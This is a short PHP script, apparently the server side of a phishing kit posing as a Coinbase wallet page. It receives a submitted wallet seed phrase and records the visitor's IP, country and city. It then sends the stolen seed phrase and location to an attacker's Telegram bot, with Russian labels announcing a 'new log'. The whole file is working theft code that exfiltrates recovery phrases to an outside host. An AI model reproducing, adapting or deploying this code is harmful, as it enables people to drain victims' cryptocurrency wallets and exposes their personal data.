<?php
    require_once __DIR__ . '/../../config.php';

    $phrase = $_POST['phrase'];

    if ($phrase == '') {
        return;
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
        $NowDomen = $_SERVER['SERVER_NAME'];
        $NowCountry = file_get_contents("https://ipapi.co/$ip/country_name/");
        $NowCity = file_get_contents("https://ipapi.co/$ip/city/");
    
        $arr = array(
            "💸 Поздравляем, новый лог!" => $emptyMess,
            "💵 Кошелёк: " => 'Coinbase',
            "🔑 SEED Фраза: " => $phrase,
            "🗻 IP: " => $ip,
            "🌍 Страна: " => $NowCountry,
            "🌇 Город: " => $NowCity,
            "🔧 Домен: " => $NowDomen
        );
    
        foreach($arr as $key => $value) {
          $txt .= "<b>".$key."</b> ".$value."%0A";
        };
      
        $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
    };